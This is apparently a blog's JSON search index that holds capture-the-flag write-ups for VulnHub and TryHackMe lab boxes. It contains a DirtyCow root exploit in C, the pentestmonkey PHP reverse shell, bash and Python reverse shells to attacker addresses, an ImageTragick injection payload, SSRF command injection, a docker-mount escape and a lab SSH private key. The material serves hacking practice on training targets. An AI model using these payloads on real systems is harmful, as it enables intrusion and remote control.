0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80};unsigned int sc_len = 136;*/void *madviseThread(void *arg){  char *str;  str=(char*)arg;  int i,c=0;  for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) {    c+=madvise(map,100,MADV_DONTNEED);  }  printf( thread stopped\n );}void *procselfmemThread(void *arg){  char *str;  str=(char*)arg;  int f=open( /proc/self/mem ,O_RDWR);  int i,c=0;  for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) {    lseek(f,map,SEEK_SET);    c+=write(f, str, sc_len);  }  printf( thread stopped\n );}void *waitForWrite(void *arg) {  char buf[sc_len];  for(;;) {    FILE *fp = fopen(suid_binary,  rb );    fread(buf, sc_len, 1, fp);    if(memcmp(buf, sc, sc_len) == 0) {      printf( %s overwritten\n , suid_binary);      break;    }    fclose(fp);    sleep(1);  }  stop = 1;  printf( Popping root shell. \n );  printf( Don't forget to restore /tmp/bak\n );  system(suid_binary);}int main(int argc,char *argv[]) {  char *backup;  printf( DirtyCow root privilege escalation\n );  printf( Backing up %s to /tmp/bak\n , suid_binary);  asprintf(&amp;backup,  cp %s /tmp/bak , suid_binary);  system(backup);  f = open(suid_binary,O_RDONLY);  fstat(f,&amp;st);  printf( Size of binary: %d\n , st. st_size);  char payload[st. st_size];  memset(payload, 0x90, st. st_size);  memcpy(payload, sc, sc_len+1);  map = mmap(NULL,st. st_size,PROT_READ,MAP_PRIVATE,f,0);  printf( Racing, this may take a while. . \n );  pthread_create(&amp;pth1, NULL, &amp;madviseThread, suid_binary);  pthread_create(&amp;pth2, NULL, &amp;procselfmemThread, payload);  pthread_create(&amp;pth3, NULL, &amp;waitForWrite, NULL);  pthread_join(pth3, NULL);  return 0;}Now we just compile this code and run in the target . Just igrone the warning and run this.  Boom!! we are root now, this so easy for people script kiddie like me :D, And thats it my writeup of Loly from vulnhub i hope you enjoy Happy hacking :D. "
    }, {
    "id": 13,
    "url": "/writeup-tryhackme-CVE-SUDOERS/",
    "title": "Tryhackme LunizzCTF (CVE SUDOERS)",
    "body": "2021/03/01 - Introduction: This is partical room from tryhackme entitled LunizzCTF with Medium difficulty, but In this Case i want to implement cve sudoers (CVE-2021-3156). In this room we will learn about boot2root, Web Exploitation and Privilage escalation with CVE. room link here  I just tried poc from sudo and I do not recommend you to use this method :D Scanning: Nmap: First let’s scanning this box with nmap : $ nmap 10. 10. 106. 87 -sC -sV Starting Nmap 7. 91 ( https://nmap. org ) at 2021-03-01 18:54 WIBNmap scan report for 10. 10. 106. 87Host is up (0. 37s latency). Not shown: 995 closed portsPORT   STATE SERVICE  VERSION22/tcp  open ssh    OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)|  256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)|_ 256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)80/tcp  open http    Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works3306/tcp open mysql   MySQL 5. 7. 32-0ubuntu0. 18. 04. 1| mysql-info: |  Protocol: 10|  Version: 5. 7. 32-0ubuntu0. 18. 04. 1|  Thread ID: 5|  Capabilities flags: 65535|  Some Capabilities: Support41Auth, SupportsLoadDataLocal, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, FoundRows, LongColumnFlag, ODBCClient, InteractiveClient, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsCompression, Speaks41ProtocolOld, LongPassword, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults|  Status: Autocommit|  Salt: EiV\x0F#\x023-J\x02\x13m\x07M\x7F\x12\x10\x13GW|_ Auth Plugin Name: mysql_native_password| ssl-cert: Subject: commonName=MySQL_Server_5. 7. 32_Auto_Generated_Server_Certificate| Not valid before: 2020-12-10T19:29:01|_Not valid after: 2030-12-08T19:29:01|_ssl-date: TLS randomness does not represent time4444/tcp open tcpwrapped5000/tcp open tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 43. 76 secondsAfter that, nmap show us the port open. As you can see the box have 5 port, i want to check directory with gobuster at webserver. and there is the result : $ gobuster dir -u 10. 10. 65. 37 -w /usr/share/dirb/wordlists/big. txt ===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://10. 10. 65. 37[+] Threads:    10[+] Wordlist:    /usr/share/dirb/wordlists/big. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Timeout:    10s===============================================================2021/03/01 21:56:18 Starting gobuster===============================================================/. htaccess (Status: 403)/. htpasswd (Status: 403)/whatever (Status: 301)I found directory /whatever there is the page : And we can’t put any command in here. After i’m scanning again with extension txt and php i found instruction. txt and contain credentials user mysql: $ gobuster dir -u 10. 10. 65. 37 -w /usr/share/dirb/wordlists/big. txt -x php,txt===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://10. 10. 65. 37[+] Threads:    10[+] Wordlist:    /usr/share/dirb/wordlists/big. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Extensions:   php,txt[+] Timeout:    10s===============================================================2021/03/01 21:56:59 Starting gobuster===============================================================/. htpasswd (Status: 403)/. htpasswd. txt (Status: 403)/. htpasswd. php (Status: 403)/. htaccess (Status: 403)/. htaccess. php (Status: 403)/. htaccess. txt (Status: 403)/hidden (Status: 301)/index. php (Status: 200)/instructions. txt (Status: 200) Getting Credentials: Login mysql: Now let’s login mysql with credentials in instructions. txt and looking for something interesting.  then i found this : it’s must be value of /whatever to command execute we must change the ‘0’ to ‘1’. update runcheck set runornot = 1; Then let’s check command in /whatever.  Getting Shell web: Its work now. Let’s put revershell to getting www-data, you can use bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1.  We got revershell now Privilage Escalations: In This challange i want to use Sudo CVE and you can get it in here.  Now we can get root easily . there is the little miss configuration in sudo(Lower version) but in the future it will be fixed by the maker. here I just tried poc from sudo and I do not recommend you to use this method. Happy hacking :D . "
    }, {
    "id": 14,
    "url": "/writeup-vulnhub-pwned1/",
    "title": "Pwned1 Writeup",
    "body": "2021/02/28 - Introduction: This is partical room from tryhackme entitled “Pwned1” form vulnhub. Difficulty of This box is Intermediate and in this box you will learn all about Fuzzing diretory, Custom exploitation, and getting privilage of root. Okay no let’s Pwn this box :p. Scanning: As usual we will scan the ip of the box. $ nmap -sV -sC 192. 168. 80. 95 Starting Nmap 7. 91 ( https://nmap. org ) at 2021-02-28 00:29 WIBNmap scan report for 192. 168. 80. 95Host is up (0. 26s latency). Not shown: 996 closed portsPORT  STATE  SERVICE    VERSION21/tcp open   ftp      vsftpd 3. 0. 322/tcp open   ssh      OpenSSH 7. 9p1 Debian 10+deb10u2 (protocol 2. 0)| ssh-hostkey: |  2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)|  256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)|_ 256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)80/tcp open   http      Apache httpd 2. 4. 38 ((Debian))|_http-server-header: Apache/2. 4. 38 (Debian)|_http-title: Pwned. . . . !!777/tcp filtered multiling-httpService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ .                                        Nmap done: 1 IP address (1 host up) scanned in 44. 66 secondsAs you can see the box have 3 port open and 1 port filtered. Let’s take a look at web apache.  Nothing to see here but let’s take a look at robots. txt . # Group 1User-agent: *Allow: /nothingAllow: /hidden_textThere are have something interesting, i’m trying to fuzzing directory with gobuster in /hidden_text then i found secret. dic : secret. dic : /hacked/vanakam_nanba/hackerman. gif /facebook/whatsapp/instagram/pwned/pwned. com/pubg /cod/fortnite/youtube/kali. org/hacked. vuln/users. vuln/passwd. vuln/pwned. vuln/backup. vuln/. ssh/root/homeSo i’m trying to fuzz again and i found page in /pwned. vuln.  in this case i’m don’t do injection like sql but just take a look the source code and we found user ftp!.  Now i’m going to login ftpuser with password we found before.  Getting User: As you can see we found folder secret which contains id_rsa and note. txt :  id_rsa  -----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----  note. txt :Wow you are here ariana won't happy about this note sorry ariana :( User ariana: You can see we did it so easyly. Now lets login with user credential .  Then let’s take a look at permission of the user ariana sudo -l. ariana@pwned:/home$ sudo -lMatching Defaults entries for ariana on pwned:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser ariana may run the following commands on pwned:  (selena) NOPASSWD: /home/messenger. shThere is permission of ariana to execute bash of selena. Content of messenger. sh is : #!/bin/bashclearecho  Welcome to linux. messenger          echo   users=$(cat /etc/passwd | grep home | cut -d/ -f 3)        echo   echo  $users         echo   read -p  Enter username to send message :   name         echo   read -p  Enter message for $name :  msg        echo   echo  Sending message to $name  $msg 2&gt; /dev/null        echo   echo  Message sent to $name :)          echo   User Selena: Now we can getting user selena with put bash -i in messenger to selena.  Privilage Escalation: As you can see selena have permission with docker, then we can escaping from docker and getting a root with this command docker run -v /:/mnt --rm -it alpine chroot /mnt bash: Now we are root So thats it my writeup i hope you enjoy , Happy hacking :D "
    }, {
    "id": 15,
    "url": "/writeup-tryhackme-magician/",
    "title": "Tryhackme Magician",
    "body": "2021/02/23 - Introduction: This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room here Scanning: Nmap: $ nmap -sC -sV -oA nmap/nmap 10. 10. 74. 239Nmap scan report for 10. 10. 74. 239Host is up (0. 37s latency). Not shown: 998 closed portsPORT   STATE SERVICE VERSION21/tcp  open ftp   vsftpd 2. 0. 8 or later8081/tcp open http  nginx 1. 14. 0 (Ubuntu)|_http-server-header: nginx/1. 14. 0 (Ubuntu)|_http-title: magicianService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Feb 23 17:27:16 2021 -- 1 IP address (1 host up) scanned in 37. 43 secondsWe just have 2 port open like FTP and Webservice (nginx). now i want to try login ftp with anonymous login.  As you can see we can’t let in but there is have some hint for us. I’m going to https://imagetragick. com which is POC of CVE-2016–3714. Now before going to web we must put host in /etc/hosts. 127. 0. 0. 1    localhost127. 0. 1. 1    Razor# CTF10. 10. 74. 239 magician# The following lines are desirable for IPv6 capable hosts::1   localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters I’m trying to using burpsuite and test POC from imagetragick which we found before.  Exploit: then i’m try to following POC from imagetragick and checking with ping back to my ip using tcpdump $ sudo tcpdump -i tun0 host magician and -n icmp. push graphic-contextviewbox 0 0 640 480fill 'url(https://127. 0. 0. 0/oos. jpg ;ping -c5 10. 2. 47. 251 )'pop graphic-context Getting Shell: And its works. i got ping back from web, So we can create revershell with bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1 then prepare for revershell with nc nc -lvnp &lt;PORT&gt; Now i got shell, then let’s make it shell to real shell .  Flag User. txt: As you can see we got user magician and let’s take the flag :D magician@magician:~$ cd /home/magician/magician@magician:~$ cat user. txt THM{s----REDACTED----x}magician@magician:~$ There is have some files namely the_magic_continues , let’s take a look the file : There is give me some hint again then let’s take a look port on This machines (netstat -punta || ss --ntpu) | grep  127 .  There are many methods we can use to tunnel the port. In this case I will use chisel and you can download that in here, Then uploaded to machine.  Now we can setup the Chisel :  First create server reverse port to tunneling port . /chisel server --reverse --port 4242.  Then create client on machines and setting R port to 6969 for access in web “localhost:6969” . /chisel client 10. 2. 47. 251:4242 R:6969:localhost:6666. Now we done for setup tunneling localhost:6666 to localhost:6969(In My Machine). Now let’s take a look the browser Then just type /root/root. txt Flag Root. txt: There is a Binary and we can convert to ASCII Then we have flag for root not :D so that’s all the writeup that I made, now we have user flag and root flag. Happy hacking :D "
    }, {
    "id": 16,
    "url": "/writeup-tryhackme-watcher/",
    "title": "Tryhackme Watcher",
    "body": "2021/02/20 - Introduction: This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room here Scanning: Nmap: First time we have to do is scanning the Machine : nmap 10. 10. 35. 205 -sC -sVStarting Nmap 7. 91 ( https://nmap. org ) at 2021-02-20 23:42 WIBNmap scan report for 10. 10. 35. 205Host is up (0. 34s latency). Not shown: 997 closed portsPORT  STATE SERVICE VERSION21/tcp open ftp   vsftpd 3. 0. 322/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)|  256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)|_ 256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-generator: Jekyll v4. 1. 1|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: CorkplacematsService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 34. 71 secondsFrom the results of nmap we know there are 3 open ports including ftp, ssh, and webserver. Now let’s take a look the webserver : Getting User: First i’m going to robots. txt, and i found this : Now lets looking at flag_1. txt. Flag 1: Then we got first flag. now lets see the content of the webserver.  As you can see there is maybe php runs a script which displays a file. and i trying File Inclusion then change striped. php to /etc/passwd. From http://10. 10. 35. 205/post. php?post=striped. php to http://10. 10. 35. 205/post. php?post=/etc/passwd.  Then its works!!. Now lets see the secret file /secret_file_do_not_read. txt in http://10. 10. 35. 205/post. php?post=/secret_file_do_not_read. txt.  And We found credentials of the ftp!, let’s check the ftp user .  Flag 2: As you can see we found flag_2. txt and get it. $ cat flag_2. txt       FLAG{f------------e}Now as you can see in ftp there is have files which is can be uploaded. then i want try to upload php-revershell. php from pentest monkey which contain : &lt;?phpset_time_limit (0);$VERSION =  1. 0 ;$ip = '10. 2. 47. 251'; // CHANGE THIS$port = 4444;    // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;if (function_exists('pcntl_fork')) {    // Fork and have the parent process exit    $pid = pcntl_fork();    if ($pid == -1) {        printit( ERROR: Can't fork );        exit(1);    }    if ($pid) {        exit(0); // Parent exits    }    // Make the current process a session leader    // Will only succeed if we forked    if (posix_setsid() == -1) {        printit( Error: Can't setsid() );        exit(1);    }    $daemon = 1;} else {    printit( WARNING: Failed to daemonise.  This is quite common and not fatal.  );}// Change to a safe directorychdir( / );// Remove any umask we inheritedumask(0);//// Do the reverse shell. . . //// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {    printit( $errstr ($errno) );    exit(1);}// Spawn shell process$descriptorspec = array(  0 =&gt; array( pipe ,  r ), // stdin is a pipe that the child will read from  1 =&gt; array( pipe ,  w ), // stdout is a pipe that the child will write to  2 =&gt; array( pipe ,  w )  // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {    printit( ERROR: Can't spawn shell );    exit(1);}// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit( Successfully opened reverse shell to $ip:$port );while (1) {    // Check for end of TCP connection    if (feof($sock)) {        printit( ERROR: Shell connection terminated );        break;    }    // Check for end of STDOUT    if (feof($pipes[1])) {        printit( ERROR: Shell process terminated );        break;    }    // Wait until a command is end down $sock, or some    // command output is available on STDOUT or STDERR    $read_a = array($sock, $pipes[1], $pipes[2]);    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);    // If we can read from the TCP socket, send    // data to process's STDIN    if (in_array($sock, $read_a)) {        if ($debug) printit( SOCK READ );        $input = fread($sock, $chunk_size);        if ($debug) printit( SOCK: $input );        fwrite($pipes[0], $input);    }    // If we can read from the process's STDOUT    // send data down tcp connection    if (in_array($pipes[1], $read_a)) {        if ($debug) printit( STDOUT READ );        $input = fread($pipes[1], $chunk_size);        if ($debug) printit( STDOUT: $input );        fwrite($sock, $input);    }    // If we can read from the process's STDERR    // send data down tcp connection    if (in_array($pipes[2], $read_a)) {        if ($debug) printit( STDERR READ );        $input = fread($pipes[2], $chunk_size);        if ($debug) printit( STDERR: $input );        fwrite($sock, $input);    }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we've daemonised ourself// (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) {    if (!$daemon) {        print  $string\n ;    }}?&gt; Let’s Upload : After doing that you must set netcat nc -lvnp 4444 for shell and we can go to file upload in http://10. 10. 35. 205/post. php?post=. . /. . /. . /. . /. . /home/ftpuser/ftp/files/php-reverse-shell. php.  So now we have shell of webserver, then we get flag_3. txt. Flag 3: www-data@watcher:$ cd /var/www/html/more_secrets_a9f10awww-data@watcher:/var/www/html/more_secrets_a9f10a$ lsflag_3. txtwww-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3. txtcat flag_3. txtFLAG{l------------y}Then i’m check the privilage with sudo -l and here is the output: sudo -lMatching Defaults entries for www-data on watcher:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on watcher:  (toby) NOPASSWD: ALLThat you can see, the user www can access user toby and we can change user without using password with this command sudo -u toby bash.  Flag 4: And there is also have flag_4. txt toby@watcher:~$ cat flag_4. txt                             cat flag_4. txt                                  FLAG{c------------e}After that we can echo shell to cow. sh, i know it because there is have note. txt and explain the user of mat create cronjob with permision of mat. Now we can put revershell to cow. sh echo  bash -i &gt;&amp; /dev/tcp/10. 2. 47. 251/1234 0&gt;&amp;1  &gt;&gt; cow. sh Note. txt : Hi Toby,I've got the cron jobs set up now so don't worry about getting that done. Mat Flag 5: Now we got the shell of user mat from the cronjob and also the flag_5. txt mat@watcher:~$ cat flag_5. txtcat flag_5. txtFLAG{li--------------------------ow}the user can access script python : mat@watcher:~$ sudo -lsudo -lMatching Defaults entries for mat on watcher:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser mat may run the following commands on watcher:  (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script. py *Then there is have some text is note. txt : Hi Mat,I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe. WillNow we can change the script and doing Python Library injection with this command : import socket,subprocess,os;s=socket. socket(socket. AF_INET,socket. SOCK_STREAM);s. connect(( 10. 2. 47. 251 ,4242));os. dup2(s. fileno(),0); os. dup2(s. fileno(),1); os. dup2(s. fileno(),2);p=subprocess. call([ /bin/sh , -i ]); Flag 6: Then run this with user will without using any password. sudo -u will /usr/bin/python3 /home/mat/scripts/will_script. py * Boom! we got the user will also the flag_6. txt ofcourse :D $ cat flag_6. txtFLAG{but_i_thought_my_script_was_secure}Privilage Escalation: After looking around i found /opt/backups/key. bs64 and this is base64 encoded We can decode it : Last Flag: Then there is id_rsa key. we can access root now with the key we found.  Boom we are root now and having a the last of flag. root@watcher:~# cat flag_7. txt FLAG{wh--------------------rs}so that’s all the writeup that I made now we have 7 flags, including root flag. Take care and Happy hacking :D "
    }, {
    "id": 17,
    "url": "/writeup-tryhackme-The-Great-Escape/",
    "title": "Tryhackme The Great Escape",
    "body": "2021/02/19 - Introduction: This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room here Scanning: Nmap: First time we have to do is scanning the Machine : $ nmap -sC -sV -oA nmap 10. 10. 50. 223Nmap scan report for 10. 10. 50. 223Host is up (0. 34s latency). Not shown: 998 closed portsPORT  STATE SERVICE VERSION22/tcp open ssh?| fingerprint-strings: |  GenericLines: |_  *W}$it$!Z5Qg-Xcg. 1|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open http  nginx 1. 19. 6| http-robots. txt: 3 disallowed entries |_/api/ /exif-util /*. bak. txt$|_http-server-header: nginx/1. 19. 6|_http-title: docker-escape-nuxt1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port22-TCP:V=7. 91%I=7%D=2/16%Time=602B9D9C%P=x86_64-pc-linux-gnu%r(GeneSF:ricLines,14, \*W}\$it\$!Z5Qg-Xcg\. 1\r\n );Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Feb 16 17:28:41 2021 -- 1 IP address (1 host up) scanned in 207. 30 secondsAs we can see there is have 2 open ports, Like ssh and webserver. Now let’s take a look the webserver : Now i found robots. txt and contain different directory and file : Enumeration: Fuzzing: wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common. txt --hc 404 http://10. 10. 50. 223/FUZZ. bak. txtAfter fuzzing i found this : http://10. 10. 3. 187/exif-util. bak. txt and which contains code like this: &lt;template&gt; &lt;section&gt;  &lt;div class= container &gt;   &lt;h1 class= title &gt;Exif Utils&lt;/h1&gt;   &lt;section&gt;    &lt;form @submit. prevent= submitUrl  name= submitUrl &gt;     &lt;b-field grouped label= Enter a URL to an image &gt;      &lt;b-input       placeholder= http://. . .         expanded       v-model= url       &gt;&lt;/b-input&gt;      &lt;b-button native-type= submit  type= is-dark &gt;       Submit      &lt;/b-button&gt;     &lt;/b-field&gt;    &lt;/form&gt;   &lt;/section&gt;   &lt;section v-if= hasResponse &gt;    &lt;pre&gt;         &lt;/pre&gt;   &lt;/section&gt;  &lt;/div&gt; &lt;/section&gt;&lt;/template&gt;&lt;script&gt;export default { name: 'Exif Util', auth: false, data() {  return {   hasResponse: false,   response: '',   url: '',  } }, methods: {  async submitUrl() {   this. hasResponse = false   console. log('Submitted URL')   try {    const response = await this. $axios. $get('http://api-dev-backup:8080/exif', {     params: {      url: this. url,     },    })    this. hasResponse = true    this. response = response   } catch (err) {    console. log(err)    this. $buefy. notification. open({     duration: 4000,     message: 'Something bad happened, please verify that the URL is valid',     type: 'is-danger',     position: 'is-top',     hasIcon: true,    })   }  }, },}&lt;/script&gt;Now let’s take a look at exif-util/, then i try to upload file image and using burpsuite to capture this.  From the information provided by burpsuite we can see that the web app made a request to /api/exif and the file name also changed Then i move to url and capture again with burpsuite, before capture i hosted files using python : python3 -m http. server 8090 Then the request has changed to GET, then i try to put http://api-dev-backup:8080/exif?url= to request.  SSRF: And as we can see there is curl, Now we can check id with command echo;id And we get id of app, So we can use SSRF. Now after i looking around i’m found dev-note. txt in here http://10. 10. 50. 223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;cd%20/;cat%20/root/dev-note. txt An error occurred: File format could not be determined        Retrieved Content        ----------------------------------------        An error occurred: File format could not be determined        Retrieved Content        ----------------------------------------        Hey guys,Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff. Anyways, the password is fluffybunnies123Cheers,HydraThen in directory of root i found . git, Now let’s check thishttp://10. 10. 50. 223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/. git%20log Author: Hydra &lt;hydragyrum@example. com&gt;Date:  Thu Jan 7 16:48:58 2021 +0000  fixed the dev notecommit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539Author: Hydra &lt;hydragyrum@example. com&gt;Date:  Wed Jan 6 20:51:39 2021 +0000  Removed the flag and original dev note b/c Securitycommit a3d30a7d0510dc6565ff9316e3fb84434916dee8Author: Hydra 